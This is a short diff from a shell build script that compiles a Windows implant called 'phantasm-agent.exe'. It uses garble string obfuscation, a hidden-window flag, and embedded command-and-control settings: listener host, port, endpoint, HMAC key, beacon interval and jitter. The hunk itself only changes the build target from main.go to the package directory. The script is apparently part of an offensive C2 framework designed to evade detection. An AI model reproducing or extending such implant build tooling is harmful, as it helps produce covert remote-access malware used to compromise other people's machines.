@@ -54,7 +54,7 @@ echo "[*] Building with garble obfuscation..."
 # Build with garble
 GOOS=windows GOARCH=amd64 garble -literals -tiny build \
     -ldflags "-H windowsgui -X main.listenerHost=$C2_HOST -X main.listenerPort=$C2_PORT -X main.listenerEndpoint=$C2_ENDPOINT -X main.hmacKeyHex=$HMAC_KEY -X main.reconnectIntervalStr=$BEACON_INTERVAL -X main.jitterSecondsStr=$JITTER" \
-    -o phantasm-agent.exe main.go
+    -o phantasm-agent.exe .
 
 if [ $? -eq 0 ]; then
     echo ""
